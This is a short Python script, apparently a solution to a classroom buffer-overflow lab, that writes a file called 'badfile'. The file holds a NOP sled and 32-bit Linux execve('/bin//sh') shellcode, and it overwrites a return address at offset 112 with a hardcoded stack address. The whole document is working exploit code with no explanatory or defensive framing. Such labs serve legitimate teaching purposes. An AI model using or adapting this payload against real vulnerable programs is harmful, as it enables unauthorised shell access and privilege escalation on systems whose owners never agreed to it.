#!/usr/bin/python3
import sys 
 
win_function = (
    "\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80"
).encode('latin-1')
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(400)) 

print(len(win_function))
# Put the shellcode at the end 
start = 400 - len(win_function) 

print(f"start:  {start}")
print(f"end:  {start+len(win_function)}")
content[start:] = win_function 
 
# Put the address at offset 112 
ret = 0xffffd2b0 + 20
content[112:116] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

